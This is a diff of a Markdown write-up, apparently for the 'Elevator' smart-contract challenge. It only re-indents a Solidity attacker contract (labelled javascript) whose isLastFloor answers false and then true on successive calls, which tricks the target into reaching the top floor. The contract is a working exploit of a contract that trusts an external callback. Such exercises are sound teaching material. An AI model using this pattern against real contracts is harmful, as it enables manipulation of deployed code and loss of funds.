@@ -81,37 +81,36 @@ Attacker Can Use Similar Contract Like This In Order to Go Top Of the Building S
 
 ```javascript
     contract Building is IBuilding {
-
-    Elevator elevator;
-    uint256 public lastFloor = 10;
-    bool isFirstCall = true;
-
-    constructor(Elevator _elevator) {
-        elevator = _elevator;
-    }
-
-    function useElevator(uint256 _floor) external {
-        elevator.goTo(_floor);
-    }
-
-    function isLastFloor(uint256 _floor) external returns (bool isLastFloorBoolean) {
-        if (_floor > lastFloor) {
-            revert("This Building Only Has 10 Floors");
+        Elevator elevator;
+        uint256 public lastFloor = 10;
+        bool isFirstCall = true;
+    
+        constructor(Elevator _elevator) {
+            elevator = _elevator;
         }
-
-        if (_floor != lastFloor) {
-            isLastFloorBoolean = false;
-        } else if (_floor == 10) {
-            if (isFirstCall) {
-                isFirstCall = false;
-                return false;
-
-            } else if (!isFirstCall) {
-                isFirstCall = true;
-                return true;
+    
+        function useElevator(uint256 _floor) external {
+            elevator.goTo(_floor);
+        }
+    
+        function isLastFloor(uint256 _floor) external returns (bool isLastFloorBoolean) {
+            if (_floor > lastFloor) {
+                revert("This Building Only Has 10 Floors");
+            }
+    
+            if (_floor != lastFloor) {
+                isLastFloorBoolean = false;
+            } else if (_floor == 10) {
+                if (isFirstCall) {
+                    isFirstCall = false;
+                    return false;
+    
+                } else if (!isFirstCall) {
+                    isFirstCall = true;
+                    return true;
+                }
             }
         }
-    }
 }
 ```
 
